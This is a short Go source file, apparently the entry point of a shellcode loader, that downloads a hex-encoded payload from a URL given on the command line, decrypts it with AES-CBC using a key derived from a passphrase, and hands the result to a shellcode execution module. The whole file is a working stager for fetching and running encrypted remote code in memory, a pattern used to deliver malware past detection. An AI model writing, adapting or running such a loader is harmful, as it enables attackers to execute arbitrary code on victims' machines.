package main

import (
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"io/ioutil"
	"log"
	"net/http"

	"project/internal/crypto/aes"

	"project/internal/modules/shellcode"
)

func main() {
	var (
		method string
		key    string
		url    string
	)
	flag.StringVar(&method, "m", "", "execute method")
	flag.StringVar(&key, "k", "test", "aes key")
	flag.StringVar(&url, "u", "", "shellcode url")
	flag.Parse()

	resp, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	}
	defer func() { _ = resp.Body.Close() }()
	cipherData, err := ioutil.ReadAll(hex.NewDecoder(resp.Body))
	if err != nil {
		log.Fatal(err)
	}
	hash := sha256.New()
	hash.Write([]byte(key))
	aesKey := hash.Sum(nil)
	sc, err := aes.CBCDecrypt(cipherData, aesKey, aesKey[:aes.IVSize])
	if err != nil {
		log.Fatal(err)
	}

	err = shellcode.Execute(method, sc)
	if err != nil {
		log.Fatal(err)
	}
}
